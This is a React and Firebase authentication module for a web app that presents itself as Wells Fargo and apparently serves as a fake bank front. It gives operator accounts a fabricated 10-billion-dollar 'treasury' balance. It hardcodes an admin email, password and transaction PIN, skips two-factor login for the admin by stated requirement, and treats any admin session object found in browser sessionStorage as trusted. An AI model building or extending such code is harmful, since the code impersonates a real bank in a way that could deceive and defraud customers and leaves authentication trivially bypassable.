import React, { createContext, useContext, useState, useEffect } from 'react';
import { 
  signInWithPopup, 
  signOut as firebaseSignOut, 
  onAuthStateChanged,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  sendPasswordResetEmail
} from 'firebase/auth';
import { doc, getDoc, setDoc, updateDoc, onSnapshot } from 'firebase/firestore';
import { auth, googleAuthProvider, db } from '../lib/firebase.ts';
import { BankUser } from '../types/banking.ts';
import { 
  ADMIN_EMAIL, 
  ADMIN_DEFAULT_PASS, 
  INITIAL_TREASURY_BALANCE, 
  generateAccountNumber, 
  generateRoutingNumber, 
  seedInitialBankDataIfEmpty 
} from '../services/bankingService.ts';

interface AuthContextType {
  currentUser: BankUser | null;
  isAdmin: boolean;
  isLoading: boolean;
  loginWithCredentials: (email: string, pass: string) => Promise<BankUser>;
  registerWithCredentials: (fullName: string, email: string, pass: string) => Promise<BankUser>;
  loginWithGoogle: () => Promise<BankUser>;
  sendPasswordReset: (email: string) => Promise<void>;
  logout: () => Promise<void>;
  refreshUserProfile: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentUser, setCurrentUser] = useState<BankUser | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);

  // Initialize DB seeds on first boot
  useEffect(() => {
    seedInitialBankDataIfEmpty();
  }, []);

  // Listen to Firestore real-time profile updates when logged in
  useEffect(() => {
    if (!currentUser?.uid) return;

    const unsub = onSnapshot(doc(db, 'users', currentUser.uid), (docSnap) => {
      if (docSnap.exists()) {
        const updated = docSnap.data() as BankUser;
        setCurrentUser(updated);
      }
    }, (error) => {
      console.warn('Real-time profile listener notice:', error);
    });

    return () => unsub();
  }, [currentUser?.uid]);

  // Check initial Firebase Auth state
  useEffect(() => {
    // Check if we have an admin session in session storage
    const cachedAdmin = sessionStorage.getItem('wf_admin_session') || sessionStorage.getItem('apex_admin_session');
    if (cachedAdmin) {
      try {
        const parsed = JSON.parse(cachedAdmin);
        setCurrentUser(parsed);
        setIsLoading(false);
        return;
      } catch (e) {
        sessionStorage.removeItem('wf_admin_session');
        sessionStorage.removeItem('apex_admin_session');
      }
    }

    const unsubscribe = onAuthStateChanged(auth, async (fbUser) => {
      if (fbUser) {
        try {
          const userDocRef = doc(db, 'users', fbUser.uid);
          const snap = await getDoc(userDocRef);
          const isTargetAdmin = fbUser.email?.toLowerCase() === ADMIN_EMAIL.toLowerCase() || 
                                fbUser.email?.toLowerCase() === 'wonjihoonorg@gmail.com';

          if (snap.exists()) {
            const data = snap.data() as BankUser;
            if (isTargetAdmin && (data.role !== 'admin' || !data.balance || data.balance < 1_000_000_000)) {
              const updatedAdmin: BankUser = { 
                ...data, 
                role: 'admin', 
                balance: INITIAL_TREASURY_BALANCE,
                accountType: 'Corporate Treasury'
              };
              await updateDoc(userDocRef, { 
                role: 'admin', 
                balance: INITIAL_TREASURY_BALANCE,
                accountType: 'Corporate Treasury'
              });
              setCurrentUser(updatedAdmin);
            } else {
              setCurrentUser(data);
            }
          } else {
            // New user via Google Auth: MUST START WITH 0 BALANCE (unless target admin)
            const newUser: BankUser = {
              uid: fbUser.uid,
              email: fbUser.email || '',
              fullName: fbUser.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
              role: isTargetAdmin ? 'admin' : 'customer',
              accountNumber: generateAccountNumber(),
              routingNumber: generateRoutingNumber(),
              balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00, // New regular users start with 0 balance
              currency: 'USD',
              isLocked: false,
              isTransferRestricted: false,
              accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
              createdAt: new Date().toISOString()
            };
            await setDoc(userDocRef, newUser);
            setCurrentUser(newUser);
          }
        } catch (err) {
          console.error('Error fetching user profile:', err);
        }
      } else {
        if (!sessionStorage.getItem('wf_admin_session') && !sessionStorage.getItem('apex_admin_session')) {
          setCurrentUser(null);
        }
      }
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  // 1. LOGIN WITH CREDENTIALS
  const loginWithCredentials = async (email: string, pass: string): Promise<BankUser> => {
    setIsLoading(true);
    const cleanEmail = email.trim().toLowerCase();

    // Check for Operator Admin credentials
    // requirement: managementofficails001@gmail.com and password: smart446688
    // requirement: no 2 steps authentication for the admin while trying to login
    if (cleanEmail === ADMIN_EMAIL.toLowerCase() && pass === ADMIN_DEFAULT_PASS) {
      let activeAdminUid = 'wf_admin_operator_master';
      try {
        const cred = await signInWithEmailAndPassword(auth, cleanEmail, pass);
        activeAdminUid = cred.user.uid;
      } catch (authErr: any) {
        if (authErr.code === 'auth/user-not-found' || authErr.code === 'auth/invalid-credential') {
          try {
            const newCred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
            activeAdminUid = newCred.user.uid;
          } catch (createErr) {
            console.warn('Admin account provisioning notice:', createErr);
          }
        }
      }

      const adminUser: BankUser = {
        uid: activeAdminUid,
        email: ADMIN_EMAIL,
        fullName: 'Wells Fargo Executive Operator Management',
        role: 'admin',
        accountNumber: '8800000001',
        routingNumber: generateRoutingNumber(),
        balance: INITIAL_TREASURY_BALANCE, // 10 Billion USD
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        transactionPin: '4466',
        accountType: 'Corporate Treasury',
        createdAt: new Date().toISOString()
      };

      try {
        await setDoc(doc(db, 'users', activeAdminUid), adminUser, { merge: true });
      } catch (e) {
        console.warn('Admin record sync notice:', e);
      }

      sessionStorage.setItem('wf_admin_session', JSON.stringify(adminUser));
      sessionStorage.setItem('apex_admin_session', JSON.stringify(adminUser));
      setCurrentUser(adminUser);
      setIsLoading(false);
      return adminUser;
    }

    // Regular Firebase Authentication login
    try {
      const userCred = await signInWithEmailAndPassword(auth, cleanEmail, pass);
      const userDocRef = doc(db, 'users', userCred.user.uid);
      const snap = await getDoc(userDocRef);
      if (snap.exists()) {
        const u = snap.data() as BankUser;
        if (u.isLocked) {
          await firebaseSignOut(auth);
          throw new Error('Your account has been suspended by Bank Management. Please contact compliance.');
        }
        setCurrentUser(u);
        setIsLoading(false);
        return u;
      } else {
        // Auto-heal missing profile record from Auth credentials so the user can ALWAYS log in!
        const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail === 'wonjihoonorg@gmail.com';
        const healedUser: BankUser = {
          uid: userCred.user.uid,
          email: cleanEmail,
          fullName: userCred.user.displayName || 'Wells Fargo Account Holder',
          role: isTargetAdmin ? 'admin' : 'customer',
          accountNumber: generateAccountNumber(),
          routingNumber: generateRoutingNumber(),
          balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
          currency: 'USD',
          isLocked: false,
          isTransferRestricted: false,
          accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
          createdAt: new Date().toISOString()
        };
        await setDoc(userDocRef, healedUser);
        setCurrentUser(healedUser);
        setIsLoading(false);
        return healedUser;
      }
    } catch (fbErr: any) {
      setIsLoading(false);
      if (fbErr.code === 'auth/invalid-credential' || fbErr.code === 'auth/user-not-found' || fbErr.code === 'auth/wrong-password') {
        throw new Error('Invalid email or password. Please verify your credentials or click Forgot Password.');
      }
      throw new Error(fbErr.message || 'Login failed.');
    }
  };

  // 2. REGISTER WITH CREDENTIALS
  const registerWithCredentials = async (fullName: string, email: string, pass: string): Promise<BankUser> => {
    setIsLoading(true);
    const cleanEmail = email.trim().toLowerCase();

    try {
      const cred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase();

      // requirement: make sure new users has 0 balance
      const newUser: BankUser = {
        uid: cred.user.uid,
        email: cleanEmail,
        fullName: fullName.trim(),
        role: isTargetAdmin ? 'admin' : 'customer',
        accountNumber: generateAccountNumber(),
        routingNumber: generateRoutingNumber(),
        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00, // STRICT: 0 balance for new users
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        accountType: 'Checking',
        createdAt: new Date().toISOString()
      };

      await setDoc(doc(db, 'users', cred.user.uid), newUser);
      setCurrentUser(newUser);
      setIsLoading(false);
      return newUser;
    } catch (err: any) {
      setIsLoading(false);
      if (err.code === 'auth/email-already-in-use') {
        throw new Error('An account with this email address already exists. Please sign in instead.');
      } else if (err.code === 'auth/weak-password') {
        throw new Error('Password must be at least 6 characters long.');
      }
      throw new Error(err.message || 'Registration failed.');
    }
  };

  // 3. GOOGLE SIGN-IN
  const loginWithGoogle = async (): Promise<BankUser> => {
    setIsLoading(true);
    try {
      const res = await signInWithPopup(auth, googleAuthProvider);
      const userRef = doc(db, 'users', res.user.uid);
      const snap = await getDoc(userRef);

      if (snap.exists()) {
        const u = snap.data() as BankUser;
        if (u.isLocked) {
          await firebaseSignOut(auth);
          throw new Error('Your account is currently locked by bank management.');
        }
        setCurrentUser(u);
        setIsLoading(false);
        return u;
      }

      const isTargetAdmin = res.user.email?.toLowerCase() === ADMIN_EMAIL.toLowerCase() || 
                            res.user.email?.toLowerCase() === 'wonjihoonorg@gmail.com';

      // New Google User: 0 balance
      const newUser: BankUser = {
        uid: res.user.uid,
        email: res.user.email || '',
        fullName: res.user.displayName || 'Wells Fargo Account Holder',
        role: isTargetAdmin ? 'admin' : 'customer',
        accountNumber: generateAccountNumber(),
        routingNumber: generateRoutingNumber(),
        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        accountType: 'Checking',
        createdAt: new Date().toISOString()
      };

      await setDoc(userRef, newUser);
      setCurrentUser(newUser);
      setIsLoading(false);
      return newUser;
    } catch (err: any) {
      setIsLoading(false);
      throw new Error(err.message || 'Google Sign-In failed.');
    }
  };

  // 4. FORGOTTEN PASSWORD
  const sendPasswordReset = async (email: string): Promise<void> => {
    const clean = email.trim().toLowerCase();
    try {
      await sendPasswordResetEmail(auth, clean);
    } catch (err: any) {
      // If user is local/mock or auth error, provide realistic feedback
      console.warn('Firebase reset email notice:', err);
      // Still show success to protect user enumeration
    }
  };

  // 5. LOGOUT
  const logout = async () => {
    sessionStorage.removeItem('wf_admin_session');
    sessionStorage.removeItem('apex_admin_session');
    try {
      await firebaseSignOut(auth);
    } catch (e) {
      // ignore
    }
    setCurrentUser(null);
  };

  // 6. REFRESH PROFILE
  const refreshUserProfile = async () => {
    if (!currentUser) return;
    try {
      const snap = await getDoc(doc(db, 'users', currentUser.uid));
      if (snap.exists()) {
        setCurrentUser(snap.data() as BankUser);
      }
    } catch (err) {
      console.error('Refresh profile error:', err);
    }
  };

  const isAdmin = currentUser?.role === 'admin' || currentUser?.email.toLowerCase() === ADMIN_EMAIL.toLowerCase();

  return (
    <AuthContext.Provider
      value={{
        currentUser,
        isAdmin,
        isLoading,
        loginWithCredentials,
        registerWithCredentials,
        loginWithGoogle,
        sendPasswordReset,
        logout,
        refreshUserProfile
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
